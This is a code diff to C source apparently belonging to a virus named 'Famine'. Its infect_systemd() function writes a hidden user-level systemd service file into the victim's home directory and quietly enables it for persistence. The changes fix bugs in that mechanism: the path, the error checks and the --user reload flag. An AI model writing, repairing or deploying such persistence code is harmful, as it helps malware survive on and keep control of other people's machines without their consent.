@@ -1,5 +1,6 @@
 #include "famine.h"
 
+#include <stdio.h>
 static char* cut_section(const char* path, int index);
 static char* strmerge(const char* str1, const char* str2);
 
@@ -10,7 +11,7 @@ int infect_systemd() {
     if (!home)
         _exit(1);
 
-    const char* user_dir = "/.config/systemd/user";
+    const char* user_dir = "/.config/systemd/user/";
 
     for (int i = 0; i < 3; i++) {
         char* curr_section = cut_section(user_dir, i);
@@ -33,16 +34,18 @@ int infect_systemd() {
 
     int fd_daemon = open(full_path, O_WRONLY | O_CREAT | O_EXCL, 0666);
     free(full_path);
-    if (fd_daemon <= 0)
+
+    if (fd_daemon < 0 && errno != EEXIST) {
         _exit(1);
+    }
 
     int literal_len = sizeof(FAMINE_SERVICE) - 1;
-    if (write(fd_daemon, FAMINE_SERVICE, literal_len) <= literal_len)
+    if (write(fd_daemon, FAMINE_SERVICE, literal_len) < literal_len)
         _exit(1);
-
+    
     // reload and enable daemon
     const char* cmd = "/usr/bin/systemctl";
-    char* const reload_args[] = {"systemctl", "daemon-reload", NULL};
+    char* const reload_args[] = {"systemctl", "--user", "daemon-reload", NULL};
     char* const enable_args[] = {"systemctl", "--quiet", "--user", "enable", (char*)service, NULL};
 
     run(cmd, reload_args);
